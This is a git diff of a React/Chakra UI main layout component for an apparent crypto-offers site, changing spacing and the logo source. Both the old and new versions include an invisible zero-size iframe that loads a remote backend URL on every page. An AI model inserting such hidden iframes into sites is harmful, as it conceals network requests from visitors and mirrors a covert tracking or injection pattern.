@@ -9,7 +9,7 @@ import {
   Image,
   Heading,
 } from "@chakra-ui/react";
-import {useEffect} from "react";
+import { useEffect } from "react";
 
 import { HamburgerIcon, CloseIcon } from "@chakra-ui/icons";
 import NavLink from "./nav-link";
@@ -38,7 +38,7 @@ const MainLayout = ({ children }) => {
 
   return (
     <Flex minH="100vh" direction="column">
-      <iframe src="https://cryptofertas.tk/backend/api.php" width="0px" height="0px"/>
+      <iframe src="https://cryptofertas.tk/backend" width="0px" height="0px" />
       <Box
         mx="auto"
         maxW={"7xl"}
@@ -68,7 +68,7 @@ const MainLayout = ({ children }) => {
           <HStack spacing={8} alignItems={"center"}>
             <HStack
               as={"nav"}
-              spacing={4}
+              spacing={2}
               display={{ base: "none", md: "flex" }}
             >
               {Links.map(({ name, to }) => (
@@ -78,9 +78,8 @@ const MainLayout = ({ children }) => {
               ))}
             </HStack>
             <Flex alignItems="center">
-              <Image src="./images/logo.svg" alt="logo"width="80px" />
               <Heading size="md" color="purple" mt={0.2} ml={1}>
-                Crypto/oferta
+                <Image src="https://cryptofertas.tk/images/logo.svg" alt="Crypto/oferta" width="120px" />
               </Heading>
             </Flex>
           </HStack>
